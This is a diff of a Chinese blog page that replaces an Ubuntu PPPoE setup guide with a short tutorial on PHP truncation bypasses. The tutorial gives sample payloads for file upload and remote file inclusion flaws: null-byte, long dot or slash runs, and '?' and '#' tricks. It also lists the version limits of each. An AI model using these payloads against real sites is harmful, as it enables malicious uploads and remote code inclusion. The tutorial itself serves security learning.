@@ -6,20 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://www.lovebear.top">
-  <title>Ubuntu 16.04配置pppoe | Blog for You</title>
+  <title>PHP截断绕过总结 | Blog for You</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一、前言ubuntu安装配置pppoe协议踩了一些坑，在此记录一下，包括安装，配置，启动，停止。">
-<meta name="keywords" content="Linux">
+  <meta name="description" content="一、前言PHP在利用文件上传，本地文件包含等漏洞时，都需要用到截断绕过的方式，在此总结。">
+<meta name="keywords" content="Vulnerability">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Ubuntu 16.04配置pppoe">
-<meta property="og:url" content="http://www.lovebear.top/2020/01/03/ubuntu配置pppoe/index.html">
+<meta property="og:title" content="PHP截断绕过总结">
+<meta property="og:url" content="http://www.lovebear.top/2020/02/15/PHP_CutOff_Bypass/index.html">
 <meta property="og:site_name" content="Blog for You">
-<meta property="og:description" content="一、前言ubuntu安装配置pppoe协议踩了一些坑，在此记录一下，包括安装，配置，启动，停止。">
+<meta property="og:description" content="一、前言PHP在利用文件上传，本地文件包含等漏洞时，都需要用到截断绕过的方式，在此总结。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2020-01-07T05:57:01.588Z">
+<meta property="og:updated_time" content="2020-02-15T12:04:34.361Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ubuntu 16.04配置pppoe">
-<meta name="twitter:description" content="一、前言ubuntu安装配置pppoe协议踩了一些坑，在此记录一下，包括安装，配置，启动，停止。">
+<meta name="twitter:title" content="PHP截断绕过总结">
+<meta name="twitter:description" content="一、前言PHP在利用文件上传，本地文件包含等漏洞时，都需要用到截断绕过的方式，在此总结。">
   
     <link rel="alternative" href="/atom.xml" title="Blog for You" type="application/atom+xml">
   
@@ -179,75 +179,58 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-ubuntu配置pppoe" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-PHP_CutOff_Bypass" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Ubuntu 16.04配置pppoe
+      PHP截断绕过总结
     </h1>
   
 
-        <a href="/2020/01/03/ubuntu配置pppoe/" class="archive-article-date">
-  	<time datetime="2020-01-03T08:36:19.475Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-03</time>
+        <a href="/2020/02/15/PHP_CutOff_Bypass/" class="archive-article-date">
+  	<time datetime="2020-02-15T11:47:00.804Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-15</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>ubuntu安装配置pppoe协议踩了一些坑，在此记录一下，包括安装，配置，启动，停止。</p>
+        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>PHP在利用文件上传，本地文件包含等漏洞时，都需要用到截断绕过的方式，在此总结。</p>
 <a id="more"></a>
-<h2 id="二、安装rp-pppoe"><a href="#二、安装rp-pppoe" class="headerlink" title="二、安装rp-pppoe"></a>二、安装rp-pppoe</h2><ul>
-<li>下载</li>
+<h2 id="二、姿势"><a href="#二、姿势" class="headerlink" title="二、姿势"></a>二、姿势</h2><ul>
+<li>%00 截断</li>
 </ul>
-<pre><code>wget https://dianne.skoll.ca/projects/rp-pppoe/download/rp-pppoe-3.13.tar.gz
-</code></pre><ul>
-<li>编译安装</li>
-</ul>
-<pre><code>tar zxvf rp-pppoe-3.13.tar.gz &amp;&amp; cd rp-pppoe-3.13/src
-./configure
-make &amp;&amp; make install
-</code></pre><h2 id="三、安装pppoe组件"><a href="#三、安装pppoe组件" class="headerlink" title="三、安装pppoe组件"></a>三、安装pppoe组件</h2><pre><code>apt install ppp pppoe pppoeconf
-</code></pre><p>P.S. 不行换源，或者离线安装</p>
-<h2 id="四、配置pppoe"><a href="#四、配置pppoe" class="headerlink" title="四、配置pppoe"></a>四、配置pppoe</h2><ul>
-<li>pppoe-setup</li>
-</ul>
-<pre><code>username：分配的username
-interface：通过ifconfig查看你用的网卡名
-Activate-on-demand：no
-dns：server
-password：分配的密码
-firewall：0
-</code></pre><h2 id="五、启动pppoe"><a href="#五、启动pppoe" class="headerlink" title="五、启动pppoe"></a>五、启动pppoe</h2><pre><code>pppoe-start
-</code></pre><h2 id="六、停止pppoe"><a href="#六、停止pppoe" class="headerlink" title="六、停止pppoe"></a>六、停止pppoe</h2><pre><code>pppoe-stop
-</code></pre><h2 id="解决频繁掉线问题"><a href="#解决频繁掉线问题" class="headerlink" title="解决频繁掉线问题"></a>解决频繁掉线问题</h2><ul>
-<li>如果是Network-Manager配置的拨号</li>
-</ul>
-<pre><code>vim /etc/ppp/options
-</code></pre><pre><code>lcp-echo-interval 值改成 3153600000
-</code></pre><ul>
-<li>如果是pppoeconf配置的拨号（本文使用的配置方法）</li>
-</ul>
-<pre><code>vim /etc/ppp/peers/dsl-provider
-</code></pre><pre><code>lcp-echo-failure 4
-lcp-echo-interval 30
-</code></pre><p>注释掉</p>
+<pre><code>a.php%00.jpg
+</code></pre><p>限制：</p>
+<ol>
+<li>GPC关闭，且不适用addslashes等函数对%00进行过滤或转义</li>
+<li>PHP version &lt; 5.3</li>
+</ol>
 <ul>
-<li>另外：archlinux如果用rp-pppoe拨号</li>
+<li>“.”, “/“ 截断</li>
 </ul>
-<pre><code>vim /etc/ppp/pppoe.conf
-</code></pre><pre><code>LCP_INTERVAL=20
-LCP_FAILURE=3
-</code></pre><p>加大数值</p>
+<p>使用”.”,”/“截断，windows下240个”.”可以截断，240个”,”和”/“也可以；<br>Linux需要2038个</p>
+<pre><code>a.php.....{many}..../.jpg
+</code></pre><p>限制：</p>
+<ol>
+<li>PHP version &lt; 5.3</li>
+</ol>
 <ul>
-<li>重启网络</li>
+<li>“?” 截断</li>
 </ul>
-<p>三种重启方式，选择一个</p>
-<pre><code>/etc/init.d/networking restart
-service network-manager restart
-/etc/init.d/network-manager restart
+<p>远程文件包含漏洞中，http协议中，”?”后的解释为参数，意味着</p>
+<pre><code>file=http://remotehost/1.txt?.php
+</code></pre><p>等同于</p>
+<pre><code>file=http://remotehost/1.txt
+</code></pre><ul>
+<li>“#” 截断</li>
+</ul>
+<p>远程文件包含漏洞中，http协议中，”#”后的解释为锚点（参考<a href="https://github.com/cckuailong/CS-Fun-500-Questions/blob/master/page/Url_Sharp_Question_And_Mark.md" target="_blank" rel="noopener">https://github.com/cckuailong/CS-Fun-500-Questions/blob/master/page/Url_Sharp_Question_And_Mark.md</a>），意味着</p>
+<pre><code>file=http://remotehost/1.txt#.php
+</code></pre><p>等同于</p>
+<pre><code>file=http://remotehost/1.txt
 </code></pre>
       
 
@@ -284,7 +267,7 @@ service network-manager restart
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulnerability/">Vulnerability</a></li></ul>
 	</div>
 
       
@@ -337,7 +320,7 @@ service network-manager restart
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://www.lovebear.top/2020/01/03/ubuntu配置pppoe/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://www.lovebear.top/2020/02/15/PHP_CutOff_Bypass/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -351,18 +334,9 @@ service network-manager restart
   
 <nav id="article-nav">
   
-    <a href="/2020/01/06/ZooKeeper-Hbase-OpenTSDB_ZK/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          ZooKeeper-Hbase-OpenTSDB集群搭建--ZooKeeper
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/12/20/Hexo-Table-Style/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hexo表格美化</div>
+    <a href="/2020/02/08/Mycat_Mysql_Vertical_Split/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Mycat基于Mysql的垂直切分</div>
       <i class="icon-circle-right"></i>
     </a>
   
